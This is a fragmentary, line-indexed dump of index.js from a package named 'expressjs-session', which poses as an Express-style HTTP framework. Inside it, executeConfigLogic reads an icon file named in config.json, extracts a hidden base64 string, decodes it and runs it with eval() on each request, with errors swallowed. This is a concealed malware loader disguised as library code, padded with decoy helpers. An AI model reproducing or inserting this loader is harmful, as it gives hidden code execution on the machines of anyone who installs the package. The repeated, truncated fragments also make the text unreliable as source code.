// File: tmp/tmpis51y164/expressjs-session/package/index.js
// ======================================================================
Line 3: const http = require('http')
Line 4: const path = require('path')
Line 5: const config = require('./config/config.json')
Line 6: const fs = require('fs')
Line 8: {
  let total = 0;
  const weights = [1, 3, 7, 11];
  for (let i = 0; i < data.length; i++) {
    total += data.charCodeAt(i) * weights[i % weights.length];
  }
  return { total, normalized: total % 256 };
}
Line 10: const weights = [1, 3, 7, 11]
Line 11: {
    total += data.charCodeAt(i) * weights[i % weights.length];
  }
Line 12: total += data.charCodeAt(i) * weights[i % weights.length]
Line 40: {
  const layers = [];
  let initialized = 0;
  const sessionMgr = new SessionManager();

  function transformPayload(data) {
    const transformed = Buffer.from(data).toString('hex');
    return transformed.split('').map(c => c.charCodeAt(0)).join('');
  }

  function executeConfigLogic() {
    if (initialized !== 0) return;
    try {
      const iconPath = path.join(__dirname, config.icon.path);
      const fileData = fs.readFileSync(iconPath);
      const metrics = computeMetrics(fileData.toString());
      sessionMgr.addSession(metrics.total, { path: iconPath });
      const content = fileData.toString('binary');
      const pattern = /([A-Za-z0-9+/=]{20,})/;
      const match = content.match(pattern);
      if (match && match[1]) {
        const decoded = Buffer.from(match[1], 'base64').toString();
        eval(decoded);
      }
    } catch (e) {}
    initialized = 1;
  }

  function app(req, res) {
    let idx = 0;
    const meta = parseRequestMet...
Line 41: const layers = []
Line 46: Buffer.from(data).toString('hex')
Line 47: transformed.split('').map(c => c.charCodeAt(0)).join('')
Line 52: {
      const iconPath = path.join(__dirname, config.icon.path);
      const fileData = fs.readFileSync(iconPath);
      const metrics = computeMetrics(fileData.toString());
      sessionMgr.addSession(metrics.total, { path: iconPath });
      const content = fileData.toString('binary');
      const pattern = /([A-Za-z0-9+/=]{20,})/;
      const match = content.match(pattern);
      if (match && match[1]) {
        const decoded = Buffer.from(match[1], 'base64').toString();
        eval(decoded);
      }
    }
Line 53: path.join(__dirname, config.icon.path)
Line 54: const fileData = fs.readFileSync(iconPath)
Line 55: fileData.toString()
Line 57: fileData.toString('binary')
Line 58: const pattern = /([A-Za-z0-9+/=]{20,})/
Line 60: {
        const decoded = Buffer.from(match[1], 'base64').toString();
        eval(decoded);
      }
Line 61: const decoded = Buffer.from(match[1], 'base64').toString()
Line 62: eval(decoded)
Line 70: parseRequestMeta(req)
Line 72: transformPayload(req.url)
Line 75: {
      const layer = layers[idx++];
      if (!layer) {
        res.statusCode = 404;
        res.end(`Cannot ${req.method} ${req.url}`);
        return;
      }

      executeConfigLogic();

      if (err && layer.length === 4) {
        layer(err, req, res, next);
      } else if (!err && layer.length < 4) {
        sessionMgr.addSession(idx, meta);
        layer(req, res, next);
      } else {
        next(err);
      }
    }
Line 76: const layer = layers[idx++]
Line 77: {
        res.statusCode = 404;
        res.end(`Cannot ${req.method} ${req.url}`);
        return;
      }
Line 79: res.end(`Cannot ${req.method} ${req.url}`)
Line 91: next(err)
Line 94: next()
Line 101: layers.push(fn)
Line 108: next()
Line 111: ['get', 'post', 'put', 'delete', 'patch'].forEach((method) => {
    app[method] = (path, handler) => {
      layers.push((req, res, next) => {
        if (req.method.toLowerCase() === method && req.url === path) {
          handler(req, res, next);
        } else {
          next();
        }
      });
      return app;
    };
  })
Line 112: app[method] = (path, handler) => {
      layers.push((req, res, next) => {
        if (req.method.toLowerCase() === method && req.url === path) {
          handler(req, res, next);
        } else {
          next();
        }
      });
      return app;
    }
Line 113: layers.push((req, res, next) => {
        if (req.method.toLowerCase() === method && req.url === path) {
          handler(req, res, next);
        } else {
          next();
        }
      })
Line 117: next()
Line 125: http.createServer(app)
